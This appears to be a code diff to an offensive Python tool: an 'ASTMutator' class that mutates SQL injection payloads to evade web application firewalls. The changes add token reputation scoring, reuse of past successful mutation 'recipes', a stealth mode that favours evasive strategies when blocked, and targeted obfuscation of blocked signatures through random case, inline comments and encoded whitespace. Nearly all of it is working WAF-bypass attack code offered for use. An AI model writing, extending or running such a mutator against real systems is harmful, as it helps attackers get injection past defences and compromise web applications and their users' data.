@@ -18,16 +18,27 @@ class ASTMutator:
         }
         # Awareness: Track success of each strategy
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
-        # Gene Credit Assignment: Track reputation of each keyword
-        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
+        # Gene Credit Assignment: Track reputation of each keyword/token
+        self.token_reputation = {kw: 1.0 for kw in self.sql_keywords}
+        # Add common structural tokens to reputation tracking
+        for token in ["/**/", "/*!", "*/", "%20", "%0A", "+", "--", "#", "'", '"', "(", ")"]:
+            self.token_reputation[token] = 1.0
+            
         self.last_strategy_used = None
         self.stealth_mode = False
         self.blocked_chars = []
         self.latency_history = []
         self.success_dna = [] # Store sequences of mutations that worked
+        self.blocked_signatures = set()
+        self.successful_recipes = [] # Store recipes (lists of strategies) that worked
 
     def apply_hint(self, hint):
         """Applies AI-driven or WAF-driven hints to mutation logic."""
+        strategy = hint.get("strategy")
+        if strategy and strategy in self.strategy_weights:
+            self.strategy_weights[strategy] *= 1.5
+            print(f"[*] Mutator: Boosting strategy {strategy} based on hint", flush=True)
+
         weights = hint.get("weights", {})
         for strat, weight in weights.items():
             if strat in self.strategy_weights:
@@ -36,8 +47,8 @@ class ASTMutator:
 
         # Keyword specific hints
         target_kw = hint.get("target_keyword")
-        if target_kw in self.keyword_reputation:
-            self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
+        if target_kw in self.token_reputation:
+            self.token_reputation[target_kw] = 0.1 # Force bypass for this keyword
             print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)
 
         # WAF specific blocked characters
@@ -48,6 +59,7 @@ class ASTMutator:
 
     def mutate(self, payload, error_msg=None, intensity=1, response_time=None):
         mutated = str(payload)
+        applied_recipe = []
         
         # 0. Dynamic Intensity Adjustment
         if response_time:
@@ -62,59 +74,93 @@ class ASTMutator:
         if " " in self.blocked_chars:
             separators = ["/**/", "/*!*/", "+", "%20", "%0A"]
             mutated = mutated.replace(" ", random.choice(separators))
+            applied_recipe.append("waf_char_replace")
         
         # 2. Error-Based Feedback: Apply specific fixes based on SQL error
         if error_msg:
             mutated = self._apply_error_feedback(mutated, error_msg)
             intensity += 1 # Errors often mean we are close, increase intensity to find the fix
+            applied_recipe.append("error_feedback")
             
         # 3. Context-Aware Mutation: Detect and wrap payload if needed
         mutated = self._context_aware_wrap(mutated)
         
-        # 4. Standard Mutations with Weighted Selection
-        num_mutations = random.randint(1, 2) * intensity
-        
-        # Awareness: If in stealth mode, favor stealthy strategies
-        current_weights = dict(self.strategy_weights)
-        if self.stealth_mode:
-            current_weights["context_aware"] *= 2.0
-            current_weights["inline_comments"] *= 2.0
-            current_weights["directed_bypass"] *= 3.0
-            current_weights["polyglot"] *= 2.0
-            print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)
+        # 4. Standard Mutations
+        # RECIPE MEMORY: 30% chance to reuse a known successful recipe if we have one
+        if self.successful_recipes and random.random() < 0.3:
+            recipe = random.choice(self.successful_recipes)
+            for strat_name in recipe:
+                if strat_name in self.strategies:
+                    mutated = self.strategies[strat_name](mutated)
+                    applied_recipe.append(strat_name)
+            print(f"  [Recipe Memory] Applied known successful recipe: {recipe}", flush=True)
+        else:
+            # Standard weighted selection
+            num_mutations = random.randint(1, 2) * intensity
+            
+            # Awareness: If in stealth mode, favor stealthy strategies
+            current_weights = dict(self.strategy_weights)
+            if self.stealth_mode:
+                current_weights["context_aware"] *= 2.0
+                current_weights["inline_comments"] *= 2.0
+                current_weights["directed_bypass"] *= 3.0
+                current_weights["polyglot"] *= 2.0
 
-        for _ in range(num_mutations):
-            # Pick strategy based on weights
-            names = list(self.strategies.keys())
-            weights = [current_weights[n] for n in names]
-            strat_name = random.choices(names, weights=weights, k=1)[0]
+            for _ in range(num_mutations):
+                names = list(self.strategies.keys())
+                weights = [current_weights[n] for n in names]
+                strat_name = random.choices(names, weights=weights, k=1)[0]
+                
+                mutated = self.strategies[strat_name](mutated)
+                applied_recipe.append(strat_name)
             
-            self.last_strategy_used = strat_name
-            mutated = self.strategies[strat_name](mutated)
-            
-        return mutated
+        # 5. Differential Bisection Analysis: Target known blocked signatures
+        for sig in self.blocked_signatures:
+            if sig in mutated:
+                mutated = mutated.replace(sig, self._obfuscate_signature(sig))
+                applied_recipe.append("diff_obfuscation")
+                
+        return mutated, applied_recipe
+
+    def _obfuscate_signature(self, sig):
+        """Applies heavy, targeted obfuscation to a specific known blocked signature."""
+        obfuscated = ""
+        for char in sig:
+            if char.isalpha():
+                # Random case toggle
+                obfuscated += char.upper() if random.random() > 0.5 else char.lower()
+                # Random inline comment insertion
+                if random.random() > 0.7:
+                    obfuscated += "/**/"
+            elif char == " ":
+                obfuscated += random.choice(["/**/", "%20", "%0a", "%09"])
+            else:
+                obfuscated += char
+        return obfuscated
 
     def report_success(self, payload, score, strategy_used=None):
-        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
+        """Gene Credit Assignment: Update strategy and token reputation based on score."""
         if not strategy_used:
             strategy_used = self.last_strategy_used
+
+        # Token-Level Credit Assignment
+        payload_upper = payload.upper()
+        for token in self.token_reputation.keys():
+            if token in payload_upper or token in payload:
+                if score <= 0.1:
+                    # Penalize tokens present in blocked payloads
+                    self.token_reputation[token] -= 0.1
+                    self.token_reputation[token] = max(0.1, self.token_reputation[token])
+                elif score >= 0.8:
+                    # Reward tokens present in successful payloads
+                    self.token_reputation[token] += 0.2
+                    self.token_reputation[token] = min(5.0, self.token_reputation[token])
 
         # Detect if we are being blocked consistently
         if score <= 0.1:
             self.stealth_mode = True
-            # Penalize keywords present in a blocked payload
-            for kw in self.sql_keywords:
-                if kw in payload.upper():
-                    self.keyword_reputation[kw] -= 0.1
-                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
         else:
             self.stealth_mode = False
-            # Reward keywords in a successful payload
-            if score > 0.5:
-                for kw in self.sql_keywords:
-                    if kw in payload.upper():
-                        self.keyword_reputation[kw] += 0.05
-                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])
 
         if strategy_used and score > 0.5:
             # Reward the strategy
@@ -160,7 +206,7 @@ class ASTMutator:
         """Directed Mutations: Apply bypasses to keywords based on their reputation."""
         mutated = payload
         # Find keywords with low reputation in the current payload
-        for kw, rep in self.keyword_reputation.items():
+        for kw, rep in self.token_reputation.items():
             if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
                 # Apply a bypass transformation
                 bypasses = [
